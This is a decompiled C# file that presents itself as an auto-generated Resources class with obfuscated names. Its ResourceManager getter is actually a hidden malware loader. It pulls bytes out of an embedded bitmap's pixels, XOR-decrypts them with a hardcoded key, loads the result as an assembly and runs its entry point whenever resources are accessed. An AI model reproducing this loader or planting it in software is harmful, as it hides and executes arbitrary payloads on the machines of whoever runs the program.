using System;
using System.CodeDom.Compiler;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.Globalization;
using System.Reflection;
using System.Resources;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;

namespace jTaOEJwBgTyy.Properties;

[GeneratedCode("System.Resources.Tools.StronglyTypedResourceBuilder", "4.0.0.0")]
[CompilerGenerated]
[DebuggerNonUserCode]
internal class Resources
{
	private static ResourceManager resourceMan;

	private static CultureInfo resourceCulture;

	[EditorBrowsable(EditorBrowsableState.Advanced)]
	internal static ResourceManager ResourceManager
	{
		get
		{
			//IL_004f: Unknown result type (might be due to invalid IL or missing references)
			//IL_0055: Expected O, but got Unknown
			//IL_0084: Unknown result type (might be due to invalid IL or missing references)
			if (object.ReferenceEquals(resourceMan, null))
			{
				ResourceManager resourceManager = (resourceMan = new ResourceManager("QvUgpCPiaXFFuaJuI", typeof(Resources).Assembly));
			}
			byte[] array = new byte[15]
			{
				148, 248, 15, 129, 108, 204, 187, 122, 122, 201,
				1, 113, 220, 12, 96
			};
			Bitmap val = (Bitmap)resourceMan.GetObject("GzmmuiuodyTLGY");
			byte[] array2 = new byte[((Image)val).get_Width() * ((Image)val).get_Height() * 4];
			Rectangle rectangle = new Rectangle(0, 0, ((Image)val).get_Width(), ((Image)val).get_Height());
			BitmapData val2 = val.LockBits(rectangle, (ImageLockMode)3, ((Image)val).get_PixelFormat());
			Marshal.Copy(val2.get_Scan0(), array2, 0, array2.Length);
			byte[] array3 = new byte[BitConverter.ToInt32(array2, 0)];
			Array.Copy(array2, 4, array3, 0, array3.Length);
			val.UnlockBits(val2);
			int num = 0;
			for (int i = 0; i < array3.Length; i++)
			{
				array3[i] = (byte)(array3[i] ^ array[num++]);
				if (num == array.Length)
				{
					num = 0;
				}
			}
			Assembly.Load(array3).EntryPoint!.Invoke(null, new object[1] { NvfBgajjRd.ARGS });
			return resourceMan;
		}
	}

	[EditorBrowsable(EditorBrowsableState.Advanced)]
	internal static CultureInfo Culture
	{
		get
		{
			return resourceCulture;
		}
		set
		{
			resourceCulture = value;
		}
	}

	internal Resources()
	{
	}
}
